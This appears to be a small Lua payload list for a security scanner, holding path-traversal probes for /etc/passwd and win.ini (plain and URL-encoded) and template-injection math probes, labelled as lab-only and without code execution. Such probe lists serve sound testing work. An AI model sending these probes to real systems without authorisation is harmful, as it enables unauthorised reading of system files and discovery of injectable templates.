-- T12 LFI and SSTI safe probes. No RCE. Lab only for wrapper checks.
local M = {
  { id = "lfi-basic", payload = "../../etc/passwd", purpose = "Unix traversal marker root:x", risk = "Medium" },
  { id = "lfi-encoded", payload = "..%2f..%2fetc%2fpasswd", purpose = "Encoded variant", risk = "Medium" },
  { id = "lfi-win", payload = "..\\..\\windows\\win.ini", purpose = "Windows lab marker", risk = "Medium" },
  { id = "ssti-math", payload = "{{7*7}}", purpose = "Template math, look for 49", risk = "Low" },
  { id = "ssti-hash", payload = "#{7*7}", purpose = "Ruby style math", risk = "Low" },
}
return M
